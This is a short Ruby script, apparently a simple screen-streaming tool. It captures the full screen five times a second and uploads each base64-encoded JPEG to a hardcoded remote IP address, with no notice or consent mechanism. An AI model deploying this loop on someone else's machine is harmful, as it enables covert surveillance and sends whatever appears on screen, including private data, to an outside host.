require 'RMagick'
require 'debugger'
require 'base64'
require 'net/http'

include Magick

loop do
    image = Image.capture {self.filename = 'root'}
    image.format = 'jpg'
    image.scale!(0.8)
    image64 = Base64.encode64(image.to_blob)
    image.destroy!

    Net::HTTP.post_form(URI.parse('http://192.241.213.182:4567'), {image: image64})
    # Net::HTTP.post_form(URI.parse('http://127.0.0.1:4567'), {image: image64})

    sleep 0.2
end
